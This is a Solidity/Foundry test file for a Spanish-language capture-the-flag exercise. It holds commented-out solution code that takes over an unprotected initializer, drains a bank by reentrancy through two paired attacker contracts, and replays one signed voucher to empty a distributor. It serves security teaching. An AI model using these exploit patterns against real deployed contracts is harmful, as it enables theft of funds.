// SPDX-License-Identifier: MIT
pragma solidity 0.8.38;

import {Test} from "forge-std/Test.sol";
import {Level1Setup} from "../src/Level1.sol";
import {Level2Setup} from "../src/Level2.sol";
import {Level3Setup} from "../src/Level3.sol";
import {BankAttacker} from "../src/attackers/BankAttacker.sol";

// ¿Qué? Los tres niveles del CTF. Cada test despliega su nivel, juega como `player` y comprueba la
//   condición de victoria con `isSolved()`.
// ¿Para qué? Practicar la mitad ofensiva de una auditoría: leer un contrato que no conoces, encontrar
//   cómo romperlo y demostrarlo con un exploit que se ejecuta.
contract SolveTest is Test {
    address player = makeAddr("player");

    function setUp() public {
        vm.deal(player, 1 ether);
    }

    function test_Paso1_SolveSafe() public {
        Level1Setup setup = new Level1Setup{value: 10 ether}();
        vm.startPrank(player, player);
        // PASO 1: vacía la caja fuerte. Solo puedes usar `setup.SAFE()`.
        // Borra la línea del revert y descomenta las líneas que empiezan con `//> `.
        revert("TODO: Paso 1");
        //> setup.SAFE().initialize(player);
        //> setup.SAFE().withdraw(payable(player));
        vm.stopPrank();
        assertTrue(setup.isSolved());
        assertEq(player.balance, 11 ether);
    }

    function test_Paso2_SolveBankSetup() public {
        Level2Setup setup = new Level2Setup{value: 10 ether}();
        vm.startPrank(player, player);
        // PASO 2: despliega dos atacantes que se conocen y mete tu 1 ETH en el banco por uno de ellos.
        // Borra la línea del revert y descomenta las líneas que empiezan con `//> `.
        revert("TODO: Paso 2");
        //> BankAttacker a = new BankAttacker(setup.BANK());
        //> BankAttacker b = new BankAttacker(setup.BANK());
        //> a.setPartner(b);
        //> b.setPartner(a);
        //> a.deposit{value: 1 ether}();
        //> assertEq(setup.BANK().balanceOf(address(a)), 1 ether);
        vm.stopPrank();
    }

    function test_Paso3_SolveBank() public {
        Level2Setup setup = new Level2Setup{value: 10 ether}();
        vm.startPrank(player, player);
        BankAttacker a = new BankAttacker(setup.BANK());
        BankAttacker b = new BankAttacker(setup.BANK());
        a.setPartner(b);
        b.setPartner(a);
        a.deposit{value: 1 ether}();
        // PASO 3: con el `receive` del atacante resuelto, retira por turnos hasta vaciar el banco.
        // Borra la línea del revert y descomenta las líneas que empiezan con `//> `.
        revert("TODO: Paso 3");
        //> for (uint256 i = 0; address(setup.BANK()).balance > 0; i++) {
        //>     (i % 2 == 0 ? a : b).withdraw();
        //> }
        //> a.collect();
        //> b.collect();
        vm.stopPrank();
        assertTrue(setup.isSolved());
        assertEq(player.balance, 11 ether);
    }

    function test_Paso4_SolveVouchers() public {
        (address signer, uint256 signerKey) = makeAddrAndKey("signer");
        Level3Setup setup = new Level3Setup{value: 10 ether}(signer);
        // El repartidor te entrega tu vale de 1 ETH: es lo único que tienes.
        bytes32 digest = keccak256(
            abi.encodePacked("\x19Ethereum Signed Message:\n32", keccak256(abi.encode(player, 1 ether)))
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerKey, digest);
        bytes memory voucher = abi.encodePacked(r, s, v);

        vm.startPrank(player, player);
        // PASO 4: vacía el repartidor con tu vale.
        // Borra la línea del revert y descomenta las líneas que empiezan con `//> `.
        revert("TODO: Paso 4");
        //> while (address(setup.VOUCHERS()).balance > 0) {
        //>     setup.VOUCHERS().claim(player, 1 ether, voucher);
        //> }
        vm.stopPrank();
        assertTrue(setup.isSolved());
        assertEq(player.balance, 11 ether);
    }
}
